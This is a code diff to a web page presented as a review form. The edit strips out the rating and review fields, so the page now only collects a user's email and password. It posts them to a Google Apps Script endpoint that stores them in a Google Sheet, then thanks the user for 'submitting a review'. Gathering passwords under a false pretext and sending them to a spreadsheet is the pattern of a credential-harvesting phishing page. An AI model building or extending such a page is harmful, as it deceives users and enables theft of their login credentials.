@@ -112,8 +112,6 @@
                 <i onclick="togglePasswordVisibility()">👁️</i>
             </div>
 
-
-
             <!-- Submit Button -->
             <button type="submit">Submit Review</button>
         </form>
@@ -140,9 +138,8 @@
             // Get form inputs
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
-           
 
-            // Validate Email, Password, Rating, and Review conditions
+            // Validate Email, Password conditions
             if (!email || email.length < 10 || !email.includes('@')) {
                 alert("Please enter a valid email (at least 10 characters and include '@').");
                 return;
@@ -153,14 +150,11 @@
                 return;
             }
 
-           
-            }
-
             // Save to Google Sheets
             saveToGoogleSheet(email, password)
                 .then(() => {
                     document.getElementById('response-message').classList.add('success');
-                    document.getElementById('response-message').innerText = `Thank you! Your review with a rating of ${rating} has been submitted successfully.`;
+                    document.getElementById('response-message').innerText = `Thank you! Your review has been submitted successfully.`;
                 })
                 .catch((error) => {
                     console.error("Error saving data:", error);
@@ -170,7 +164,7 @@
         }
 
         // Save Data to Google Sheets
-        function saveToGoogleSheet(email, password, rating, review) {
+        function saveToGoogleSheet(email, password) {
             const scriptURL = "https://script.google.com/macros/s/AKfycbz0z281mdADtFUWvWV-C1yvh8EA20P3w33b3-DL6MZkIsXXF72CD8iJx7n4t16mSbN-/exec"; // Replace with your script URL
             return fetch(scriptURL, {
                 method: "POST",
